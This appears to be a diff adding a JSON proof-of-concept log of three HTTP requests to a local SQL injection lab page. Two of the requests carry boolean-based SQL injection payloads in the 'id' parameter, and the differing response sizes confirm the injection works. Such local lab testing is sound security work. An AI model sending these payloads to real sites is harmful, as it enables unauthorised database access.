@@ -1,0 +1,65 @@
+[
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9081/Less-1/index.php?id=1",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9081",
+      "Connection": "close",
+      "X-Powered-By": "PHP/5.6.40",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 721,
+    "response_sha256": "14fec1f7152894b9059a40aa92ec4abd1faf3542648e32aafc7e1bf17412b779",
+    "started_at": "2026-10-19T14:07:00+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9081/Less-1/index.php?id=1%27%20AND%20%271%27%3D%271",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9081",
+      "Connection": "close",
+      "X-Powered-By": "PHP/5.6.40",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 721,
+    "response_sha256": "14fec1f7152894b9059a40aa92ec4abd1faf3542648e32aafc7e1bf17412b779",
+    "started_at": "2026-10-19T14:07:00+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9081/Less-1/index.php?id=1%27%20AND%20%271%27%3D%272",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9081",
+      "Connection": "close",
+      "X-Powered-By": "PHP/5.6.40",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 670,
+    "response_sha256": "cf6c54521d5a69125361e945a9bbae421792beab01ce7770f0d151035f45dc29",
+    "started_at": "2026-10-19T14:07:00+08:00"
+  }
+]
